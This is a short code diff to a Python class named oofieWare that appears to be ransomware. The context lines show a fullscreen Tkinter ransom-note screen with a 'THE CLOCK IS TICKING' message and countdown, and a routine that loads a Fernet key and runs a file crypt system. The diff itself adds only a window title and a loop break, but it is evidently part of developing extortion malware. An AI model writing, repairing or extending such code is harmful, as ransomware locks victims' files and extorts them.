@@ -154,6 +154,7 @@ class oofieWare:
         THE CLOCK IS TICKING'''
 
         window = tk.Tk()
+        window.title('Ransom Note')
         window.attributes('-fullscreen', True)
 
         def countdown(count):
@@ -239,6 +240,7 @@ class oofieWare:
                     self.key = dec.read()
                     self.decrypter = Fernet(self.key)
                     self.crypt_system()
+                    break
 
             except Exception as e:
                 pass
